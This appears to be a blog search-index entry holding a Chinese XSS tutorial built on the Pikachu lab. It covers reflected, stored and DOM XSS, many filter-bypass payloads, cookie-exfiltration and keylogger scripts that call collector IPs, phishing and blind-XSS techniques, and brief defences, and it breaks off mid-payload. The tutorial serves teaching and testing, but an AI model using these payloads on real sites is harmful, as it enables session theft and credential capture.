<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS 跨站脚本攻击</title>
      <link href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-XSS漏洞基础"><a href="#1-XSS漏洞基础" class="headerlink" title="1. XSS漏洞基础"></a>1. XSS漏洞基础</h2><p><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/index.html">https://websec.readthedocs.io/zh/latest/vuln/xss/index.html</a></p><hr><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一，仅次于SQL注入。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。由此可知，XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p><hr><h3 id="XSS漏洞出现的原因"><a href="#XSS漏洞出现的原因" class="headerlink" title="XSS漏洞出现的原因"></a>XSS漏洞出现的原因</h3><p>程序对输入输出的控制不够严格，导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行从而产生危害。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ce0226cf5848186fe7bb2440157ac740.png" alt="img"></p><hr><h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>a.劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。</p><p>b.框架钓鱼：利用XSS漏洞，我们可以在网页中插入恶意js代码，通过js代码，我们可以干很多事情，例如伪造一个登陆页面。当用户访问该网页时，就会自动弹出登陆页面，如果用户信以为真，输入了用户名与密码，信息就会传输到攻击者的服务器中，完成账号窃取。</p><p>c.网站挂马<br>d.键盘记录</p><hr><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p><strong>a.反射型(非持久性)</strong><br>只对本次访问有影响，传参中有攻击代码，交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。</p><p>攻击者构造恶意的 URL，其中包含恶意脚本。当用户点击带有恶意参数的 URL 时，服务器将恶意脚本作为响应的一部分返回给用户浏览器，并在浏览器中执行。</p><p><strong>payload</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/070dea4c37d08353277c3b291893c9fb.jpeg" alt="img"></p><hr><p><strong>b.存储型（持久性）</strong><br>存储到网站（数据库，日志或者其他东西），永久性存储，不带攻击传参，访问链接，如果生效就是存储型XSS。</p><p>存储型 XSS 发生在网站存储用户提交的数据，且未经过滤或转义的情况下直接在网页中显示。攻击者提交包含恶意脚本的数据，然后其他用户在访问包含该数据的页面时，恶意脚本将在他们的浏览器中执行。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fb2f35c49a9724aec14de089ffc95142.jpeg" alt="img"></p><hr><p><strong>c.Dom型（不一定）</strong><br>DOM 型的 XSS 注入与反射型原理类似，只不过 DOM 型的 XSS 注入不需要经过后端代码处理，不与后台服务器产生数据交互，而是在前端。<br>JavaScript 调用 DOM 元素时可能产生的漏洞，可能触发 DOM 型 XSS 的 JavaScript 代码，大部分属于反射型XSS。</p><p>闭合标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;(111)&quot;</span><br><span class="line">&#x27; onclick=&quot;(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><hr><p><em>&lt;1.什么是Dom</em><br>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p><hr><p><em>&lt;2.Dom型Xss简介</em><br>DOM型XSS其实是一种特殊类型的XSS，它是基于DOM文档对象模型的一种漏洞。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><hr><p><em>&lt; 3.Dom型XSS的危害</em></p><blockquote><p>DOM-XSS不经过服务端，只看服务端的日志和数据库，很难排查到<br>DOM-XSS一般是通杀浏览器的<br>DOM-XSS一般是被攻击的时候就执行了XSS，由于是前端DOM操作导致，很难留下痕迹</p></blockquote><hr><p><em>&lt;4.Document对象属性</em><br>Document的存在可以让浏览器获取网页信息，然后用JS来填充来节约服务器性能。<br>因为前端代码都在客户浏览器上面执行和服务器无关，另外，XSS攻击的目标是目标浏览器，不是攻击目标服务器。</p><p><strong>常见的Document对象属性</strong></p><blockquote><p>cookie &#x2F;&#x2F;设置或读取当前文档有关的所有cookie<br>domain &#x2F;&#x2F;返回当前文档的域名<br>lastModified &#x2F;&#x2F;返回文档被最后修改的日期和时间<br>referrer &#x2F;&#x2F;返回载入当前文档的来源文档的URL<br>title &#x2F;&#x2F;返回当前文档的标题<br>URL &#x2F;&#x2F;返回当前文档的URL<br>write() &#x2F;&#x2F;向文档写HTML表达式或JS代码</p></blockquote><p>document.cookie （XSS必备函数）<br>document.lastModified （识别伪静态必备）<br>document.write() （Dom型XSS常见存在方式）</p><hr><p>&lt;5.Dom型XSS的三种常见状态</p><p>a.document.write()（网页跳转）</p><blockquote><p>var pos&#x3D;document.URL.indexOf(“name&#x3D;”)+5; &#x2F;&#x2F;取name&#x3D;后面的值<br>var username &#x3D; unescape(document.URL.substring(pos,document.URL.length)); &#x2F;&#x2F;取name&#x3D;后面的值<br>var r&#x3D;‘<strong>’+username+‘</strong>’<br>document.write®;<br><img src="https://img-blog.csdnimg.cn/direct/67f06de3179c4cf48621e0d6ec3360a3.png" alt="在这里插入图片描述"></p></blockquote><p>这里利用indexof获取url里的传参，然后用document.write()输出到HTML中,完成xss。<br>这种方式是非常隐蔽的，因为我们的传参没有和后端交互。这里使用？发送的数据包中可以看到咱们的传参<img src="https://img-blog.csdnimg.cn/538920a4b59143d5ab8052883bc3e89c.png" alt="在这里插入图片描述"><br>但是我们这里使用锚点#，后端是不会识别锚点的，锚点只是给浏览器用的。<img src="https://img-blog.csdnimg.cn/85cf5240d1fe49d7afdd9cbe90a260d4.png" alt="在这里插入图片描述"><br>这种数据包里都没有咱们的传参值的，非常的隐蔽！还有是document.write()它可以接受native编码，有时可以利用这个特性来绕waf！</p><p>b.innerHTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;666&#x27;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">fun()</span> <span class="attr">value</span>=<span class="string">&quot;点击有惊喜&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> url=<span class="built_in">unescape</span>(<span class="variable language_">document</span>.<span class="property">URL</span>);<span class="comment">//unescape函数是JavaScript中的一个全局函数，用于将被转义的字符串还原成原始字符串。它是escape函数的逆操作。</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pos=url.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;666&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hi,&lt;b&gt;&quot;</span>+url.<span class="title function_">substring</span>(pos,url.<span class="property">length</span>)+<span class="string">&#x27;&lt;/b&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>innerHTML是改变标签中的值，像上面的代码是innerHTML将div标签中的hello改成Hi+name的值<img src="https://img-blog.csdnimg.cn/a66128ed151e4e7bb33493d9df5144d7.png" alt="在这里插入图片描述"><br>使用谷歌浏览器传入没有发生弹窗，但是使用事件型的XSS语句可以触发弹窗，这是因为像谷歌（不仅限于谷歌)浏览器会对典型的、太明显的XSS语句进行拦截。</p><p>c.eval()</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a =location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>);<span class="comment">//location.hash是取锚点</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">eval</span>(a);   <span class="comment">// eval是高危函数。 把字符串当做代码进行执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/af040794c54f44efbeee9d810703c10b.png" alt="在这里插入图片描述"><br>让location.hash获取网页锚点后的值放入eval中当作代码执行。</p><h2 id="2-XSS漏洞挖掘方法"><a href="#2-XSS漏洞挖掘方法" class="headerlink" title="2. XSS漏洞挖掘方法"></a>2. XSS漏洞挖掘方法</h2><h3 id="XSS可能存在的地方"><a href="#XSS可能存在的地方" class="headerlink" title="XSS可能存在的地方"></a>XSS可能存在的地方</h3><p>只要是用户输入输出、交互的地方，都可能存在XSS漏洞。</p><p>HTML content</p><p>Attribute content</p><p>URL content </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;a标签&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>Style content</p><p>Script content</p><p>登录、注册、评论、留言等</p><h3 id="XSS测试方法"><a href="#XSS测试方法" class="headerlink" title="XSS测试方法"></a>XSS测试方法</h3><p>1、工具扫描：APPscan、AWVS、xray等大型漏扫工具、xsstrike等自动化小工具。</p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>2、手工测试：Burpsuite、Firefox（hackbar）</p><hr><h2 id="3-XSS攻击框架"><a href="#3-XSS攻击框架" class="headerlink" title="3. XSS攻击框架"></a>3. XSS攻击框架</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">在<span class="title class_">Console</span>可输入以下代码</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>;<span class="comment">/*获取当前网页地址，document可省略。=&#x27;url&#x27;可跳转*/</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&#x27;url&#x27;</span>;<span class="comment">//跳转到url页面 eg：location.href=&quot;https://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;url&#x27;</span>;<span class="comment">//跳转到url页面</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>;<span class="comment">//获取当前网页的所有cookie</span></span><br><span class="line"></span><br><span class="line">alert               <span class="title function_">alert</span>()方法用于显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>    <span class="variable language_">window</span>.<span class="property">location</span>对象用于获得当前页面的地址(<span class="variable constant_">URL</span>) ,并把浏览器重定向到新的页面 </span><br><span class="line">onload                  一张页面或一幅图像完成加载 </span><br><span class="line">onsubmit              确认按钮被点击 </span><br><span class="line">onerror                 在加载文档或图像时发生错误</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>  url编码 %3Cscript%3Ealert%<span class="number">281</span>%<span class="number">29</span>%3C%2Fscript%3E</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;  弹框内容为/</span><span class="variable constant_">XSS</span>/</span><br><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script&gt;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;//弹框cookie信息</span></span><br><span class="line"><span class="string">&lt;svg onload=alert(document.domain)&gt;//弹框域名</span></span><br><span class="line"><span class="string">&lt;img src=1 onerror=alert(/hi/)&gt;</span></span><br><span class="line"><span class="string">&lt;M onmouseover=alert(document.domain)&gt;M</span></span><br><span class="line"><span class="string">&lt;marquee onscroll=alert(document.domain)&gt;//失效</span></span><br><span class="line"><span class="string">&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;body onload=alert(document.domain)&gt;</span></span><br><span class="line"><span class="string">&lt;details open ontoggle=alert(document.domain)&gt;//点击详细信息</span></span><br><span class="line"><span class="string">&lt;embed src=javascript:alert(document.domain)&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSS平台搭建及后台使用（cookie获取）"><a href="#XSS平台搭建及后台使用（cookie获取）" class="headerlink" title="XSS平台搭建及后台使用（cookie获取）"></a>XSS平台搭建及后台使用（cookie获取）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script&gt;document.location = &#x27;</span><span class="attr">http</span>:<span class="comment">//127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://121.199.162.86:8889/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">//通过document.location实例进行重定向到http://192.168.1.1/pikachu/pkxss/xcookie/cookie.php?cookie=</span></span><br></pre></td></tr></table></figure><p>打开pikachu-&gt;管理工具-&gt;XSS后台，登录后点击“cookie搜集”。</p><h3 id="反射型XSS（POST）获取cookie"><a href="#反射型XSS（POST）获取cookie" class="headerlink" title="反射型XSS（POST）获取cookie"></a>反射型XSS（POST）获取cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Window</span>.<span class="property">onload</span>;<span class="comment">//当浏览器加载完页面所有内容后自动触发执行</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">POST</span>攻击利用页面：~\phpstudy_pro\phpstudy_pro\<span class="variable constant_">WWW</span>\pikachu\pkxss\xcookie\post.<span class="property">html</span></span><br></pre></td></tr></table></figure><p>将post.html中的ip地址和xss路径进行修改，引导别人打开这个HTML文件，打开后就自动发送cookie信息到xss后台。</p><h4 id="使用cookie登录"><a href="#使用cookie登录" class="headerlink" title="使用cookie登录"></a><strong>使用cookie登录</strong></h4><p>打开正常登录后的网址<a href="http://pikachu/vul/xss/xsspost/xss_reflected_post.php%EF%BC%8C%E4%BD%BF%E7%94%A8Burpsuite%E6%8B%A6%E6%88%AA%EF%BC%8C%E5%B0%86cookie%E6%94%B9%E4%B8%BAxss%E5%90%8E%E5%8F%B0%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84cookie%EF%BC%8C%E6%94%BE%E8%A1%8C%E5%90%8E%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E3%80%82">http://pikachu/vul/xss/xsspost/xss_reflected_post.php，使用Burpsuite拦截，将cookie改为xss后台收集到的cookie，放行后即可登录成功。</a></p><h3 id="XSS钓鱼演示"><a href="#XSS钓鱼演示" class="headerlink" title="XSS钓鱼演示"></a>XSS钓鱼演示</h3><p>方法有很多，但主要看页面搭建的好不好，是不是和正常网站页面一样，能不能骗到别人。只要有XSS漏洞的地方，都可以钓鱼。</p><p>以pikachu的存储型xss为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">钓鱼攻击利用页面：~\phpstudy_pro\phpstudy_pro\WWW\pikachu\pkxss\xfish\fish.php</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://121.199.162.86:8889/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://118.89.145.124/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开fish.php，修改ip地址为xss后台。</p><p>fish.php代码内容为弹出一个对话框，将用户在对话框中输入的用户名和密码发送到攻击者的xfish.php文件中，保存到攻击者数据库中。</p><blockquote><p>钓鱼页面在输入账号密码后经常会提示登录超时等，需要重新登录，网站也会发生变化。</p></blockquote><blockquote><p>phpstudy钓鱼演示，认证失败。</p><p><strong>PHP的HTTP认证机制仅在PHP以Apache模块方式运行时才有效，因此该功能不适用于CGI版本。</strong></p><p><strong>解决方案：重新部署环境</strong></p><p><a href="https://mp.weixin.qq.com/s/NR6tAA8vKexBZ6KXLQXxhA">https://mp.weixin.qq.com/s/NR6tAA8vKexBZ6KXLQXxhA</a></p></blockquote><h3 id="XSS获取键盘记录演示"><a href="#XSS获取键盘记录演示" class="headerlink" title="XSS获取键盘记录演示"></a>XSS获取键盘记录演示</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;http://121.199.162.86:8889/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;http://118.89.145.124/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入到存储型XSS页面中。</p><p>在该页面敲击键盘，XSS后台页面能够看到键盘记录。</p><h3 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h3><p>盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言、feedback之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。</p><p>“xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。</p><p> 通俗讲就是见到输入框就输入提前准备的xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hi<span class="string">&#x27;&quot;&gt;&lt;sCrIpT&gt;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&lt;/sCrIpT&gt;</span></span><br><span class="line"><span class="string">hi&#x27;</span><span class="string">&quot;&gt;&lt;sCrIpT&gt;alert(666)&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure><p>管理员登录时查看相关页面，触发JS代码。</p><h2 id="4-XSS防御手段"><a href="#4-XSS防御手段" class="headerlink" title="4. XSS防御手段"></a>4. XSS防御手段</h2><p>对输入进行过滤，特殊符号必须过滤掉，单引号、双引号、尖括号等，对输出进行编码。</p><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string $string, int $quote_style = ENT_COMPAT, string $encoding = &#x27;UTF-8&#x27;, bool $double_encode = true)</span><br></pre></td></tr></table></figure><ul><li><code>$string</code>：需要转换的字符串。</li><li><code>$quote_style</code>：指定引号的风格。通常有三个可选值：<code>ENT_COMPAT</code>、<code>ENT_QUOTES</code> 和 <code>ENT_NOQUOTES</code>。<code>ENT_COMPAT</code> 会输出成 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&amp;</code>，<code>ENT_QUOTES</code> 会在 <code>ENT_COMPAT</code> 的基础上将单引号也转换为实体字符（<code>&#39;</code>），<code>ENT_NOQUOTES</code> 则不会输出引号。</li><li><code>$encoding</code>：设置字符编码，默认是 <code>UTF-8</code>。</li><li><code>$double_encode</code>：布尔值，指示是否对已经存在的实体进行再次编码。<br>使用 <code>htmlspecialchars</code> 函数可以避免跨站脚本攻击（XSS），因为它可以确保用户输入的字符串被正确地处理，不会因为浏览器解释特殊字符而执行不必要的脚本。</li></ul><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>以下为需要过滤的常见字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|  &amp;  ;  $  %  @  &#x27;  &quot;  \&#x27;  \&quot;  &lt;&gt;  ()  +  CR  LF  ,  \</span><br></pre></td></tr></table></figure><h2 id="XSS跨站常见绕过方式"><a href="#XSS跨站常见绕过方式" class="headerlink" title="XSS跨站常见绕过方式"></a>XSS跨站常见绕过方式</h2><p>XSS攻击绕过过滤方法大全：<a href="https://blog.csdn.net/qq_50854790/article/details/124297046">https://blog.csdn.net/qq_50854790/article/details/124297046</a></p><p>1、对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如输入框限制20个字符，但是前端的限制对能力强的攻击者来讲是无用的。可以抓包改请求包，或者直接在前端代码中修改等。</p><p>2、后端</p><p><strong>大小写混合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipT&gt;ALert(&#x27;XSS&#x27;)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;script&gt;ALert(1)&lt;/script&gt;</span><br><span class="line">&lt;sCrIpT&gt;ALert(1)&lt;/sCrIpT&gt;</span><br><span class="line">&lt;ScRiPt&gt;ALert(1)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;sCrIpT&gt;ALert(1)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;ScRiPt&gt;ALert(1)&lt;/sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;iMg src=1 oNeRrOr=alert(1)&gt;</span><br><span class="line">&lt;ImG src=1 OnErRoR=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;alert(&amp;quot;M&amp;quot;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;marquee onscroll=alert(1)&gt;//失效</span><br><span class="line">&lt;mArQuEe OnScRoLl=alert(1)&gt;</span><br><span class="line">&lt;MaRqUeE oNsCrOlL=alert(1)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>双写</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(123);&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>其它标签绕过</strong></p><p>img等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">##</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">123</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span>//字母“o”是希腊字母，无效</span><br><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;hello&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=alert(document.cookie)&gt;请点击&lt;/a&gt;</span><br><span class="line">&quot; &gt;&lt;a href=javascript:alert(123)&gt;请点击&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onfocus=javascript:alert(123)</span><br></pre></td></tr></table></figure><p>iframe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe 